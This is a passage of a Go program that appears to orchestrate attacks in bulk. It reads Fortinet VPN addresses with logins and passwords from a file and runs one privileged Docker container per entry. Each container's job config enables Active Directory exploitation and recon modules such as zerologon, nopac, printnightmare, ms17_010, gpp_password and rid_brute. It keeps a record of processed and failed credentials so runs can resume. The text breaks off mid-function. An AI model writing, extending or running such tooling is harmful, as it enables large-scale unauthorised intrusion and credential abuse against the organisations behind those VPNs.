// main.go — хостовый оркестратор (Docker worker pool).
//
// Исправления:
//   - BuildImage: Dockerfile + scripts/ в ОДНОМ tar-потоке (было два writer'а на один буфер)
//   - scripts/ пакуется с префиксом "scripts/" — совпадает с COPY scripts/ /src/ в Dockerfile
//   - extractReports ищет .json и .txt (reporter пишет .json)
//   - resourceLimits защищён от деления на ноль
//   - AutoRemove=false, удаление контейнера в defer
//   - Удалены неиспользуемые импорты (mount)
package main

import (
	"archive/tar"
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/mem"
)

const (
	DEFAULT_WORKER_POOL_SIZE = 5
	DEFAULT_TIMEOUT          = 180 * time.Minute
	DEFAULT_QUEUE_SIZE       = 5
	DEFAULT_MAX_RETRIES      = 3
	PROCESSED_FILE           = "processed_configs.txt"
	FAILED_FILE              = "failed_configs.txt"

	SYSTEM_RESERVED_CPU_PERCENT = 15.0
	SYSTEM_RESERVED_MEM_PERCENT = 15.0
	RESOURCE_CHECK_INTERVAL     = 5 * time.Second
	RESOURCE_COOLDOWN_DURATION  = 30 * time.Second
)

const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
	ColorBold   = "\033[1m"
)

// ─── Types ────────────────────────────────────────────────────────────────

type Job struct {
	ID        int
	VPNConfig string
	Attempt   int
	MaxRetry  int
}

type Result struct {
	JobID     int
	VPNConfig string
	Success   bool
	Error     error
	Duration  time.Duration
	Timestamp time.Time
}

type ResourceMonitor struct {
	cpuLimit      float64
	memLimit      uint64
	isPaused      atomic.Bool
	lastPauseTime time.Time
	pauseCount    int32
	mu            sync.Mutex
	ctx           context.Context
	cancel        context.CancelFunc
}

type Worker struct {
	ID          int
	JobQueue    chan Job
	ResultQueue chan Result
	StopSignal  chan bool
	Manager     *VPNContainerManager
	ctx         context.Context
	stopped     atomic.Bool
}

type WorkerPool struct {
	Workers      []*Worker
	JobQueue     chan Job
	ResultQueue  chan Result
	Manager      *VPNContainerManager
	wg           sync.WaitGroup
	ctx          context.Context
	cancel       context.CancelFunc
	shutdownOnce sync.Once
	closed       atomic.Bool
	paused       atomic.Bool
}

type VPNContainerManager struct {
	dockerClient     *client.Client
	config           Config
	usedConfigs      map[string]bool
	processedConfigs map[string]bool
	failedConfigs    map[string]string
	mu               sync.Mutex
	metrics          *Metrics
	workerPool       *WorkerPool
	processedFile    *os.File
	failedFile       *os.File
	resourceMonitor  *ResourceMonitor
}

type Config struct {
	ImageName        string
	InputFile        string
	ScriptsPath      string
	OutputPath       string
	WorkerPoolSize   int
	QueueSize        int
	ContainerTimeout time.Duration
	MaxRetries       int
	GlobalTimeout    time.Duration
}

type Metrics struct {
	Total      int32
	Success    int32
	Failed     int32
	Running    int32
	Retried    int32
	InQueue    int32
	Paused     int32
	StartTime  time.Time
	mu         sync.Mutex
	LastUpdate time.Time
}

// ─── Metrics ──────────────────────────────────────────────────────────────

func NewMetrics() *Metrics {
	return &Metrics{StartTime: time.Now(), LastUpdate: time.Now()}
}

func (m *Metrics) PrintProgress() {
	m.mu.Lock()
	defer m.mu.Unlock()
	total := atomic.LoadInt32(&m.Total)
	success := atomic.LoadInt32(&m.Success)
	failed := atomic.LoadInt32(&m.Failed)
	running := atomic.LoadInt32(&m.Running)
	inQueue := atomic.LoadInt32(&m.InQueue)
	retried := atomic.LoadInt32(&m.Retried)
	paused := atomic.LoadInt32(&m.Paused)
	completed := success + failed
	elapsed := time.Since(m.StartTime)
	throughput := float64(0)
	if elapsed.Seconds() > 0 {
		throughput = float64(completed) / elapsed.Seconds()
	}
	eta := "N/A"
	if throughput > 0 && total > completed {
		remaining := float64(total-completed) / throughput
		eta = time.Duration(remaining * float64(time.Second)).Round(time.Second).String()
	}
	pauseStatus := ""
	if paused > 0 {
		pauseStatus = fmt.Sprintf(" | %s PAUSED%s", ColorYellow, ColorReset)
	}
	pct := float64(0)
	if total > 0 {
		pct = float64(completed) / float64(total) * 100
	}
	fmt.Printf("\r%s[PROGRESS]%s Queue:%s%d%s Running:%s%d%s OK:%s%d%s Fail:%s%d%s Retry:%d %d/%d (%.1f%%) %.2f/s ETA:%s Time:%s%s",
		ColorBold+ColorCyan, ColorReset,
		ColorBlue, inQueue, ColorReset,
		ColorYellow, running, ColorReset,
		ColorGreen, success, ColorReset,
		ColorRed, failed, ColorReset,
		retried, completed, total, pct, throughput, eta,
		elapsed.Round(time.Second), pauseStatus)
	m.LastUpdate = time.Now()
}

func (m *Metrics) FinalReport() {
	elapsed := time.Since(m.StartTime)
	total := atomic.LoadInt32(&m.Total)
	success := atomic.LoadInt32(&m.Success)
	failed := atomic.LoadInt32(&m.Failed)
	retried := atomic.LoadInt32(&m.Retried)
	pauseCount := atomic.LoadInt32(&m.Paused)
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Printf("%s[FINAL REPORT]%s\n", ColorBold+ColorCyan, ColorReset)
	fmt.Println(strings.Repeat("=", 80))
	fmt.Printf("Total configurations:    %d\n", total)
	fmt.Printf("%sSuccessfully processed:%s %d (%.1f%%)\n", ColorGreen, ColorReset, success, safePct(success, total))
	fmt.Printf("%sFailed:%s                 %d (%.1f%%)\n", ColorRed, ColorReset, failed, safePct(failed, total))
	fmt.Printf("Retried attempts:        %d\n", retried)
	fmt.Printf("Resource pauses:         %d\n", pauseCount)
	fmt.Printf("Total time:              %s\n", elapsed.Round(time.Second))
	if success > 0 {
		fmt.Printf("Average time/success:    %s\n", time.Duration(elapsed.Nanoseconds()/int64(success)).Round(time.Second))
		fmt.Printf("Throughput:              %.2f containers/minute\n", float64(success)/elapsed.Minutes())
	}
	fmt.Println(strings.Repeat("=", 80))
}

func safePct(a, b int32) float64 {
	if b == 0 {
		return 0
	}
	return float64(a) / float64(b) * 100
}

// ─── ResourceMonitor ──────────────────────────────────────────────────────

func NewResourceMonitor(ctx context.Context) *ResourceMonitor {
	mctx, cancel := context.WithCancel(ctx)
	numCPU := runtime.NumCPU()
	cpuLimit := float64(numCPU) * (100.0 - SYSTEM_RESERVED_CPU_PERCENT)
	vmStat, _ := mem.VirtualMemory()
	memLimit := uint64(float64(vmStat.Total) * (100.0 - SYSTEM_RESERVED_MEM_PERCENT) / 100.0)
	rm := &ResourceMonitor{cpuLimit: cpuLimit, memLimit: memLimit, ctx: mctx, cancel: cancel}
	logInfo("ResourceMonitor", fmt.Sprintf("CPU limit: %.1f%% of %d cores | Mem limit: %.1fGB",
		cpuLimit, numCPU, float64(memLimit)/(1024*1024*1024)))
	return rm
}

func (rm *ResourceMonitor) Start(pool *WorkerPool) {
	go func() {
		t := time.NewTicker(RESOURCE_CHECK_INTERVAL)
		defer t.Stop()
		for {
			select {
			case <-rm.ctx.Done():
				return
			case <-t.C:
				rm.check(pool)
			}
		}
	}()
}

func (rm *ResourceMonitor) check(pool *WorkerPool) {
	cpuPercent, err := cpu.Percent(time.Second, false)
	if err != nil {
		return
	}
	vmStat, err := mem.VirtualMemory()
	if err != nil {
		return
	}
	totalCPU := cpuPercent[0]
	usedMem := vmStat.Used
	memPercent := vmStat.UsedPercent
	cpuOverload := totalCPU > rm.cpuLimit
	memOverload := usedMem > rm.memLimit

	rm.mu.Lock()
	defer rm.mu.Unlock()
	if cpuOverload || memOverload {
		if !rm.isPaused.Load() {
			rm.isPaused.Store(true)
			rm.lastPauseTime = time.Now()
			atomic.AddInt32(&rm.pauseCount, 1)
			pool.Pause()
			atomic.StoreInt32(&pool.Manager.metrics.Paused, 1)
			logWarning("ResourceMonitor", fmt.Sprintf("PAUSE CPU=%.1f%% Mem=%.1f%%", totalCPU, memPercent))
		}
	} else if rm.isPaused.Load() && time.Since(rm.lastPauseTime) > RESOURCE_COOLDOWN_DURATION {
		rm.isPaused.Store(false)
		pool.Resume()
		atomic.StoreInt32(&pool.Manager.metrics.Paused, 0)
		logSuccess("ResourceMonitor", fmt.Sprintf("RESUME CPU=%.1f%% Mem=%.1f%%", totalCPU, memPercent))
	}
}

func (rm *ResourceMonitor) Stop() { rm.cancel() }

func (rm *ResourceMonitor) GetStats() string {
	cpuPercent, _ := cpu.Percent(time.Second, false)
	vmStat, _ := mem.VirtualMemory()
	return fmt.Sprintf("CPU: %.1f%% | Mem: %.1f%% (%.1fGB/%.1fGB)",
		cpuPercent[0], vmStat.UsedPercent,
		float64(vmStat.Used)/(1024*1024*1024), float64(vmStat.Total)/(1024*1024*1024))
}

// ─── Worker ───────────────────────────────────────────────────────────────

func NewWorker(id int, manager *VPNContainerManager, jq chan Job, rq chan Result, ctx context.Context) *Worker {
	return &Worker{ID: id, JobQueue: jq, ResultQueue: rq, StopSignal: make(chan bool, 1), Manager: manager, ctx: ctx}
}

func (w *Worker) Start(wg *sync.WaitGroup) {
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() { w.stopped.Store(true); logInfo(fmt.Sprintf("Worker-%d", w.ID), "Stopped") }()
		logInfo(fmt.Sprintf("Worker-%d", w.ID), "Started")
		for {
			select {
			case job, ok := <-w.JobQueue:
				if !ok {
					return
				}
				for w.Manager.workerPool.paused.Load() {
					time.Sleep(time.Second)
					select {
					case <-w.ctx.Done():
						select {
						case w.JobQueue <- job:
						default:
						}
						return
					default:
					}
				}
				atomic.AddInt32(&w.Manager.metrics.Running, 1)
				atomic.AddInt32(&w.Manager.metrics.InQueue, -1)
				st := time.Now()
				err := w.processJob(job)
				dur := time.Since(st)
				if err != nil && job.Attempt < job.MaxRetry {
					atomic.AddInt32(&w.Manager.metrics.Retried, 1)
					job.Attempt++
					logWarning(fmt.Sprintf("Worker-%d", w.ID),
						fmt.Sprintf("Job %d fail (attempt %d/%d), retry", job.ID, job.Attempt, job.MaxRetry))
					time.Sleep(time.Duration(job.Attempt) * 5 * time.Second)
					select {
					case w.JobQueue <- job:
						atomic.AddInt32(&w.Manager.metrics.InQueue, 1)
					case <-w.ctx.Done():
						atomic.AddInt32(&w.Manager.metrics.Running, -1)
						return
					}
				} else {
					if err == nil {
						atomic.AddInt32(&w.Manager.metrics.Success, 1)
						w.Manager.saveProcessedConfig(job.VPNConfig)
					} else {
						atomic.AddInt32(&w.Manager.metrics.Failed, 1)
						w.Manager.saveFailedConfig(job.VPNConfig, err.Error())
					}
					select {
					case w.ResultQueue <- Result{JobID: job.ID, VPNConfig: job.VPNConfig, Success: err == nil, Error: err, Duration: dur, Timestamp: time.Now()}:
					default:
					}
				}
				atomic.AddInt32(&w.Manager.metrics.Running, -1)
			case <-w.StopSignal:
				return
			case <-w.ctx.Done():
				return
			}
		}
	}()
}

func (w *Worker) processJob(job Job) error {
	cname := fmt.Sprintf("vpn-worker-%d-job-%d-%d", w.ID, job.ID, time.Now().UnixNano())
	logInfo(cname, fmt.Sprintf("Worker-%d job %d (attempt %d)", w.ID, job.ID, job.Attempt))

	cid, err := w.Manager.createContainer(cname, job.VPNConfig)
	if err != nil {
		logError(cname, fmt.Sprintf("create: %v", err))
		return err
	}
	defer w.Manager.removeContainer(cid)

	if err := w.Manager.dockerClient.ContainerStart(w.ctx, cid, container.StartOptions{}); err != nil {
		logError(cname, fmt.Sprintf("start: %v", err))
		return err
	}

	logCtx, logCancel := context.WithCancel(w.ctx)
	go w.Manager.streamLogs(logCtx, cid, cname)
	defer logCancel()

	timeoutCtx, timeoutCancel := context.WithTimeout(w.ctx, w.Manager.config.ContainerTimeout)
	defer timeoutCancel()

	statusCh, errCh := w.Manager.dockerClient.ContainerWait(timeoutCtx, cid, container.WaitConditionNotRunning)
	select {
	case err := <-errCh:
		if err != nil {
			logError(cname, fmt.Sprintf("wait: %v", err))
			return err
		}
	case status := <-statusCh:
		if status.StatusCode != 0 {
			err := fmt.Errorf("container exited %d", status.StatusCode)
			logError(cname, err.Error())
			return err
		}
		logSuccess(cname, "completed")
	case <-timeoutCtx.Done():
		logWarning(cname, "timeout, stopping")
		t := 10
		w.Manager.dockerClient.ContainerStop(context.Background(), cid, container.StopOptions{Timeout: &t})
		return fmt.Errorf("container timeout after %v", w.Manager.config.ContainerTimeout)
	}

	if err := w.Manager.extractReports(cid, cname); err != nil {
		logWarning(cname, fmt.Sprintf("extract: %v", err))
	} else {
		logSuccess(cname, "reports extracted")
	}
	return nil
}

// ─── WorkerPool ───────────────────────────────────────────────────────────

func NewWorkerPool(size, queueSize int, manager *VPNContainerManager) *WorkerPool {
	if size <= 0 {
		size = DEFAULT_WORKER_POOL_SIZE
	}
	if queueSize <= 0 {
		queueSize = DEFAULT_QUEUE_SIZE
	}
	ctx, cancel := context.WithCancel(context.Background())
	p := &WorkerPool{
		Workers:     make([]*Worker, size),
		JobQueue:    make(chan Job, queueSize),
		ResultQueue: make(chan Result, queueSize),
		Manager:     manager,
		ctx:         ctx,
		cancel:      cancel,
	}
	for i := 0; i < size; i++ {
		w := NewWorker(i+1, manager, p.JobQueue, p.ResultQueue, ctx)
		p.Workers[i] = w
		w.Start(&p.wg)
	}
	return p
}

func (p *WorkerPool) Submit(job Job) error {
	if p.closed.Load() {
		return fmt.Errorf("worker pool is closed")
	}
	select {
	case p.JobQueue <- job:
		atomic.AddInt32(&p.Manager.metrics.InQueue, 1)
		return nil
	case <-p.ctx.Done():
		return fmt.Errorf("worker pool is closed")
	default:
		return fmt.Errorf("job queue is full")
	}
}

func (p *WorkerPool) Pause()  { p.paused.Store(true) }
func (p *WorkerPool) Resume() { p.paused.Store(false) }

func (p *WorkerPool) Shutdown() {
	p.shutdownOnce.Do(func() {
		logInfo("WorkerPool", "Shutting down...")
		p.closed.Store(true)
		p.cancel()
		for _, w := range p.Workers {
			select {
			case w.StopSignal <- true:
			default:
			}
		}
		done := make(chan struct{})
		go func() { p.wg.Wait(); close(done) }()
		select {
		case <-done:
			logInfo("WorkerPool", "All workers stopped")
		case <-time.After(30 * time.Second):
			logWarning("WorkerPool", "Shutdown timeout")
		}
		close(p.JobQueue)
		close(p.ResultQueue)
		logInfo("WorkerPool", "Shutdown complete")
	})
}

// ─── Logging ──────────────────────────────────────────────────────────────

func logInfo(c, m string)    { fmt.Printf("[%s] %s[%s]%s %s\n", time.Now().Format("15:04:05"), ColorCyan, c, ColorReset, m) }
func logSuccess(c, m string) { fmt.Printf("[%s] %s[%s]%s %s✓%s %s\n", time.Now().Format("15:04:05"), ColorGreen, c, ColorReset, ColorGreen, ColorReset, m) }
func logError(c, m string)   { fmt.Printf("[%s] %s[%s]%s %s✗%s %s\n", time.Now().Format("15:04:05"), ColorRed, c, ColorReset, ColorRed, ColorReset, m) }
func logWarning(c, m string) { fmt.Printf("[%s] %s[%s]%s %s⚠%s %s\n", time.Now().Format("15:04:05"), ColorYellow, c, ColorReset, ColorYellow, ColorReset, m) }

// ─── main ─────────────────────────────────────────────────────────────────

func main() {
	config := Config{
		ImageName:        "adrecon-runner:latest",
		InputFile:        "input_vpn.txt",
		ScriptsPath:      "./scripts",
		OutputPath:       "./reports",
		WorkerPoolSize:   DEFAULT_WORKER_POOL_SIZE,
		QueueSize:        DEFAULT_QUEUE_SIZE,
		ContainerTimeout: DEFAULT_TIMEOUT,
		MaxRetries:       DEFAULT_MAX_RETRIES,
		GlobalTimeout:    24 * time.Hour,
	}

	if v := os.Getenv("WORKER_POOL_SIZE"); v != "" {
		var n int
		if _, err := fmt.Sscanf(v, "%d", &n); err == nil && n > 0 {
			config.WorkerPoolSize = n
		}
	}
	if v := os.Getenv("QUEUE_SIZE"); v != "" {
		var n int
		if _, err := fmt.Sscanf(v, "%d", &n); err == nil && n > 0 {
			config.QueueSize = n
		}
	}
	if v := os.Getenv("GLOBAL_TIMEOUT_HOURS"); v != "" {
		var n int
		if _, err := fmt.Sscanf(v, "%d", &n); err == nil && n > 0 {
			config.GlobalTimeout = time.Duration(n) * time.Hour
		}
	}

	fmt.Printf("%s╔══════════════════════════════════════════════════════════════════════╗%s\n", ColorPurple, ColorReset)
	fmt.Printf("%s║       VPN Container Manager — Resource-aware worker pool             ║%s\n", ColorPurple, ColorReset)
	fmt.Printf("%s╚══════════════════════════════════════════════════════════════════════╝%s\n", ColorPurple, ColorReset)

	if err := os.MkdirAll(config.OutputPath, 0755); err != nil {
		log.Fatalf("%s✗ mkdir output: %v%s", ColorRed, err, ColorReset)
	}

	manager, err := NewVPNContainerManager(config)
	if err != nil {
		log.Fatalf("%s✗ manager: %v%s", ColorRed, err, ColorReset)
	}
	defer manager.Close()

	csiclPath := filepath.Join(config.ScriptsPath, "cmd", "csicl", "main.go")
	if _, err := os.Stat(csiclPath); os.IsNotExist(err) {
		log.Fatalf("%s✗ %s not found%s", ColorRed, csiclPath, ColorReset)
	}
	fmt.Printf("%s✓ Found csicl at %s%s\n", ColorGreen, csiclPath, ColorReset)

	fmt.Printf("\n%s[BUILD]%s Building Docker image...\n", ColorYellow, ColorReset)
	if err := manager.BuildImage(); err != nil {
		log.Fatalf("%s✗ build image: %v%s", ColorRed, err, ColorReset)
	}
	fmt.Printf("%s✓ Image built%s\n\n", ColorGreen, ColorReset)

	configs, err := manager.ReadAndFilterConfigs()
	if err != nil {
		log.Fatalf("%s✗ read input: %v%s", ColorRed, err, ColorReset)
	}
	if len(configs) == 0 {
		fmt.Printf("%s✓ Nothing to process%s\n", ColorGreen, ColorReset)
		return
	}
	atomic.StoreInt32(&manager.metrics.Total, int32(len(configs)))
	fmt.Printf("%s✓ %d configs | workers=%d queue=%d timeout=%v%s\n",
		ColorGreen, len(configs), config.WorkerPoolSize, config.QueueSize, config.GlobalTimeout, ColorReset)

	ctx, cancel := context.WithTimeout(context.Background(), config.GlobalTimeout)
	defer cancel()

	manager.resourceMonitor.Start(manager.workerPool)
	defer manager.resourceMonitor.Stop()

	progressDone := make(chan bool)
	go func() {
		t := time.NewTicker(500 * time.Millisecond)
		defer t.Stop()
		for {
			select {
			case <-t.C:
				manager.metrics.PrintProgress()
			case <-progressDone:
				manager.metrics.PrintProgress()
				fmt.Println()
				return
			}
		}
	}()

	resultsDone := make(chan bool)
	go manager.processResults(resultsDone)

	manager.ProcessVPNConfigs(ctx, configs)

	progressDone <- true
	resultsDone <- true

	fmt.Println()
	fmt.Printf("\n%s[RESOURCES]%s %s\n", ColorCyan, ColorReset, manager.resourceMonitor.GetStats())
	manager.metrics.FinalReport()
}

// ─── VPNContainerManager ──────────────────────────────────────────────────

func NewVPNContainerManager(cfg Config) (*VPNContainerManager, error) {
	cli, err := client.NewClientWithOpts(client.FromEnv, client.WithAPIVersionNegotiation())
	if err != nil {
		return nil, fmt.Errorf("docker client: %w", err)
	}
	processedFile, err := os.OpenFile(PROCESSED_FILE, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return nil, fmt.Errorf("processed file: %w", err)
	}
	failedFile, err := os.OpenFile(FAILED_FILE, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		processedFile.Close()
		return nil, fmt.Errorf("failed file: %w", err)
	}
	m := &VPNContainerManager{
		dockerClient:     cli,
		config:           cfg,
		usedConfigs:      map[string]bool{},
		processedConfigs: map[string]bool{},
		failedConfigs:    map[string]string{},
		metrics:          NewMetrics(),
		processedFile:    processedFile,
		failedFile:       failedFile,
	}
	m.loadProcessed()
	m.workerPool = NewWorkerPool(cfg.WorkerPoolSize, cfg.QueueSize, m)
	m.resourceMonitor = NewResourceMonitor(context.Background())
	return m, nil
}

func (m *VPNContainerManager) loadProcessed() {
	if f, err := os.Open(PROCESSED_FILE); err == nil {
		sc := bufio.NewScanner(f)
		for sc.Scan() {
			m.processedConfigs[strings.TrimSpace(sc.Text())] = true
		}
		f.Close()
		if len(m.processedConfigs) > 0 {
			fmt.Printf("%s✓ Loaded %d processed configs%s\n", ColorGreen, len(m.processedConfigs), ColorReset)
		}
	}
	if f, err := os.Open(FAILED_FILE); err == nil {
		sc := bufio.NewScanner(f)
		for sc.Scan() {
			line := strings.TrimSpace(sc.Text())
			p := strings.SplitN(line, " | ERROR: ", 2)
			if len(p) > 0 {
				m.failedConfigs[p[0]] = line
			}
		}
		f.Close()
	}
}

func (m *VPNContainerManager) saveProcessedConfig(c string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.processedFile != nil {
		m.processedFile.WriteString(c + "\n")
		m.processedFile.Sync()
	}
	m.processedConfigs[c] = true
}

func (m *VPNContainerManager) saveFailedConfig(c, errMsg string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.failedFile != nil {
		m.failedFile.WriteString(fmt.Sprintf("%s | ERROR: %s | TIME: %s\n",
			c, errMsg, time.Now().Format("2006-01-02 15:04:05")))
		m.failedFile.Sync()
	}
	m.failedConfigs[c] = errMsg
}

func (m *VPNContainerManager) ReadAndFilterConfigs() ([]string, error) {
	f, err := os.Open(m.config.InputFile)
	if err != nil {
		return nil, fmt.Errorf("open input: %w", err)
	}
	defer f.Close()
	uniq := map[string]bool{}
	var configs []string
	sc := bufio.NewScanner(f)
	line, skipped := 0, 0
	for sc.Scan() {
		line++
		l := strings.TrimSpace(sc.Text())
		if l == "" || strings.HasPrefix(l, "#") {
			continue
		}
		if len(strings.Split(l, ":")) != 4 {
			logWarning("INPUT", fmt.Sprintf("line %d invalid: %s", line, l))
			continue
		}
		if m.processedConfigs[l] {
			skipped++
			continue
		}
		if !uniq[l] {
			uniq[l] = true
			configs = append(configs, l)
		}
	}
	if skipped > 0 {
		fmt.Printf("%s✓ Skipped %d processed%s\n", ColorGreen, skipped, ColorReset)
	}
	return configs, sc.Err()
}

func (m *VPNContainerManager) ProcessVPNConfigs(ctx context.Context, configs []string) {
	fmt.Printf("%s[JOBS]%s Processing %d configs%s\n", ColorYellow, ColorReset, len(configs), ColorReset)
	pending := make(chan Job, len(configs))
	for i, c := range configs {
		m.mu.Lock()
		if m.usedConfigs[c] {
			m.mu.Unlock()
			continue
		}
		m.usedConfigs[c] = true
		m.mu.Unlock()
		pending <- Job{ID: i + 1, VPNConfig: c, Attempt: 1, MaxRetry: m.config.MaxRetries}
	}
	total := len(pending)
	atomic.StoreInt32(&m.metrics.Total, int32(total))

	submitDone := make(chan bool)
	go func() {
		submitted := 0
		for len(pending) > 0 {
			select {
			case job := <-pending:
				for {
					err := m.workerPool.Submit(job)
					if err == nil {
						submitted++
						break
					}
					if strings.Contains(err.Error(), "closed") {
						submitDone <- true
						return
					}
					time.Sleep(100 * time.Millisecond)
				}
			case <-ctx.Done():
				submitDone <- true
				return
			}
		}
		fmt.Printf("%s[JOBS]%s All submitted: %d%s\n", ColorGreen, ColorReset, submitted, ColorReset)
		submitDone <- true
	}()

	tick := time.NewTicker(5 * time.Second)
	defer tick.Stop()
	for {
		select {
		case <-ctx.Done():
			logWarning("ProcessVPNConfigs", "context timeout")
			m.workerPool.Shutdown()
			return
		case <-tick.C:
			inQ := atomic.LoadInt32(&m.metrics.InQueue)
			run := atomic.LoadInt32(&m.metrics.Running)
			done := atomic.LoadInt32(&m.metrics.Success) + atomic.LoadInt32(&m.metrics.Failed)
			if int(done) >= total && run == 0 && inQ == 0 {
				time.Sleep(2 * time.Second)
				select {
				case <-submitDone:
				case <-time.After(5 * time.Second):
				}
				m.workerPool.Shutdown()
				return
			}
		}
	}
}

func (m *VPNContainerManager) processResults(done chan bool) {
	for {
		select {
		case r := <-m.workerPool.ResultQueue:
			if r.Success {
				logSuccess(fmt.Sprintf("Job-%d", r.JobID), fmt.Sprintf("done in %s", r.Duration.Round(time.Second)))
			} else {
				logError(fmt.Sprintf("Job-%d", r.JobID), fmt.Sprintf("fail: %v (%s)", r.Error, r.Duration.Round(time.Second)))
			}
		case <-done:
			for len(m.workerPool.ResultQueue) > 0 {
				r := <-m.workerPool.ResultQueue
				if r.Success {
					logSuccess(fmt.Sprintf("Job-%d", r.JobID), "done")
				} else {
					logError(fmt.Sprintf("Job-%d", r.JobID), fmt.Sprintf("fail: %v", r.Error))
				}
			}
			return
		}
	}
}

// ─── Build / Container ────────────────────────────────────────────────────

// BuildImage собирает образ из ./scripts + ./Dockerfile.
// КРИТИЧНО: Dockerfile и scripts/ должны быть в ОДНОМ tar-потоке,
// иначе Docker не находит Dockerfile в build-контексте.
func (m *VPNContainerManager) BuildImage() error {
	scriptsAbs, err := filepath.Abs(m.config.ScriptsPath)
	if err != nil {
		return fmt.Errorf("scripts abs: %w", err)
	}
	if _, err := os.Stat(filepath.Join(scriptsAbs, "go.mod")); err != nil {
		return fmt.Errorf("scripts/go.mod missing: %w", err)
	}
	dfPath, err := filepath.Abs("Dockerfile")
	if err != nil {
		return fmt.Errorf("Dockerfile abs: %w", err)
	}
	df, err := os.ReadFile(dfPath)
	if err != nil {
		return fmt.Errorf("read Dockerfile: %w", err)
	}

	// Один tar-стрим: Dockerfile + scripts/ (с префиксом "scripts/")
	tarBuf := new(bytes.Buffer)
	tw := tar.NewWriter(tarBuf)

	if err := writeTarFile(tw, "Dockerfile", df, 0644); err != nil {
		tw.Close()
		return fmt.Errorf("add Dockerfile: %w", err)
	}
	if err := writeTarDir(tw, scriptsAbs, "scripts"); err != nil {
		tw.Close()
		return fmt.Errorf("tar scripts: %w", err)
	}
	if err := tw.Close(); err != nil {
		return fmt.Errorf("close tar: %w", err)
	}

	buildOptions := types.ImageBuildOptions{
		Tags:       []string{m.config.ImageName},
		Dockerfile: "Dockerfile",
		Remove:     true,
		NoCache:    false,
	}

	resp, err := m.dockerClient.ImageBuild(context.Background(), bytes.NewReader(tarBuf.Bytes()), buildOptions)
	if err != nil {
		return fmt.Errorf("image build: %w", err)
	}
	defer resp.Body.Close()

	sc := bufio.NewScanner(resp.Body)
	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	for sc.Scan() {
		line := sc.Text()
		if strings.Contains(line, "Step") || strings.Contains(line, "Successfully") {
			fmt.Printf("  %s\n", line)
		}
		if strings.Contains(line, "ERROR") || strings.Contains(line, "error") {
			fmt.Printf("  %s%s%s\n", ColorRed, line, ColorReset)
		}
	}
	return nil
}

// writeTarDir рекурсивно добавляет содержимое dir в tar.
// prefix — префикс внутри архива (например, "scripts" → "scripts/cmd/...").
func writeTarDir(tw *tar.Writer, dir, prefix string) error {
	return filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		rel, err := filepath.Rel(dir, path)
		if err != nil {
			return err
		}
		if rel == "." {
			return nil
		}
		name := filepath.ToSlash(filepath.Join(prefix, rel))
		hdr, err := tar.FileInfoHeader(info, "")
		if err != nil {
			return err
		}
		hdr.Name = name
		if info.IsDir() {
			hdr.Name += "/"
		}
		if err := tw.WriteHeader(hdr); err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		f, err := os.Open(path)
		if err != nil {
			return err
		}
		defer f.Close()
		_, err = io.Copy(tw, f)
		return err
	})
}

// writeTarFile добавляет один файл в tar.
func writeTarFile(tw *tar.Writer, name string, data []byte, mode int64) error {
	hdr := &tar.Header{Name: name, Size: int64(len(data)), Mode: mode}
	if err := tw.WriteHeader(hdr); err != nil {
		return err
	}
	_, err := tw.Write(data)
	return err
}

func (m *VPNContainerManager) createContainer(name, vpnConfig string) (string, error) {
	cpuQuota, cpuPeriod, memLimit := m.resourceLimits()

	hostConfig := &container.HostConfig{
		Privileged: true,
		CapAdd: []string{
			"NET_ADMIN", "NET_RAW", "SYS_ADMIN", "NET_BROADCAST",
			"NET_BIND_SERVICE", "SYS_MODULE", "SYS_NICE", "IPC_LOCK",
		},
		Resources: container.Resources{
			CPUQuota:  cpuQuota,
			CPUPeriod: cpuPeriod,
			Memory:    memLimit,
			Devices: []container.DeviceMapping{
				{PathOnHost: "/dev/net/tun", PathInContainer: "/dev/net/tun", CgroupPermissions: "rwm"},
			},
		},
		AutoRemove:  false,
		DNS:         []string{"8.8.8.8", "1.1.1.1"},
		SecurityOpt: []string{"apparmor=unconfined", "seccomp=unconfined"},
		Sysctls: map[string]string{
			"net.ipv4.ip_forward":                   "1",
			"net.ipv4.conf.all.forwarding":          "1",
			"net.ipv4.conf.default.forwarding":      "1",
			"net.ipv4.conf.all.rp_filter":           "0",
			"net.ipv4.conf.default.rp_filter":       "0",
			"net.ipv4.conf.all.accept_source_route": "1",
			"net.ipv6.conf.all.forwarding":          "1",
			"net.ipv6.conf.default.forwarding":      "1",
			"net.ipv6.conf.all.disable_ipv6":        "0",
		},
	}
	containerConfig := &container.Config{
		Image:      m.config.ImageName,
		Env:        []string{"DEBIAN_FRONTEND=noninteractive"},
		Hostname:   name,
		WorkingDir: "/app/work",
		Cmd:        []string{"/app/bin/csicl"},
		Tty:        true,
	}

	resp, err := m.dockerClient.ContainerCreate(context.Background(), containerConfig, hostConfig, nil, nil, name)
	if err != nil {
		return "", fmt.Errorf("container create: %w", err)
	}
	cid := resp.ID

	// Копируем job_config.json и input.txt в /app/work
	parts := strings.SplitN(vpnConfig, ":", 4)
	if len(parts) >= 4 {
		jobCfg := fmt.Sprintf(
			`{"ip":"%s","port":%s,"vendor":"fortinet","group":"default","credentials":[{"login":"%s","password":"%s"}],"scan":{"mode":"full","modules":["shares","users","groups","rid_brute","pass_pol","spider_plus","laps","gpp_password","gpp_autologin","zerologon","nopac","smbghost","printnightmare","coerce_plus","ms17_010","ntlmv1","webdav","enum_av","enum_ca","ioxidresolver","ntlm_reflection"],"timeout_seconds":3600,"threads":10},"kerbrute":{"enabled":false}}`,
			parts[0], parts[1], parts[2], parts[3])

